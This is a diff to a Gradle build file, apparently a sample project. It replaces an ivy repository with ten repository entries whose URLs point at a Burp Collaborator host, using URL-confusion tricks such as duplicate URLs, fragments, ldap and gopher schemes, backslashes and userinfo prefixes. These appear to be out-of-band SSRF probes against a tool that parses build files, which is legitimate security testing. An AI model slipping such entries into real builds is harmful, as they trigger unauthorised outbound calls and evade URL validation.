@@ -6,14 +6,37 @@ mainClassName = 'hello.HelloWorld'
 
 // tag::repositories[]
 repositories { 
-    ivy {
-        url 'https://ajax.googleapis.com/ajax/libs'
-        patternLayout {
-            artifact '[organization]/[revision]/[module].[ext]'
-        }
-        metadataSources {
-            artifact()
-        }
+    vanilla {
+        url 'http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/vanilla'
+    }
+    duplicate-a {
+        url 'http://snyk.io'
+        url 'http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/duplicate-a
+    }
+    duplicate-b {
+        url 'http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/duplicate-b'
+        url 'http://snyk.io'
+    }
+    fragment {
+        url 'http://snyk.io#fragment.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net'
+    }
+    scheme-confusion {
+        url 'ldap://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/ldap-scheme'
+    }
+    scheme-confusion2 {
+        url 'gopher://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/gopher-scheme'
+    }
+    slash-confusion {
+        url 'http:///v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/s-confusion'
+    }
+    backslash-confusion {
+        url 'http:\\v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/bs-confusion'
+    }
+    credentials {
+        url 'http://snyk.io@v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/creds'
+    }
+    no-scheme {
+        url 'v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/no-scheme'
     }
 }
 // end::repositories[]
